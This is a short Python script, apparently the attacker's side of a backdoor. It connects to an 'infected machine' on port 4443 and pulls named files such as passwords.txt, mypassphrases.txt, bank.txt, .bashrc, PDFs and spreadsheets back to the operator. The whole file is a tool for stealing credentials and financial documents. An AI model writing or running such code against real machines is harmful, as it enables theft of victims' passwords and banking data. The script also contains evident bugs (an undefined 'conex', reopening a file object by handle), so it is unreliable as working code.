import socket

IP = input("Infected Machine IP Address: ")
client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
try:
  resp = input("Do you want bruteforce possible files to dump?(yes/no): ")
  if "yes" in resp:
    client.connect((IP, 4443))
    file_name = ["mypasswords.txt", "passwords.txt", ".bashrc", "__init__.py", "bank.txt", "mypassphrases.txt", "mypasswds.txt", "*.pdf", "*.xls", "*.txt"]
    for item in file_name:
      client.send(item.encode())
      with open(item, 'wb') as file:
        data = client.recv(1000000)
        if not data:
          print("Attempting new dump...")
          conex.close()
          break
        file.write(data)
      with open(file, 'r') as file2:
        if None in file2 or "ls: cannot access" in file2:
          print(f"File {item} is empty or not founded!")
        else:
          print(f"File {item} received!")
        
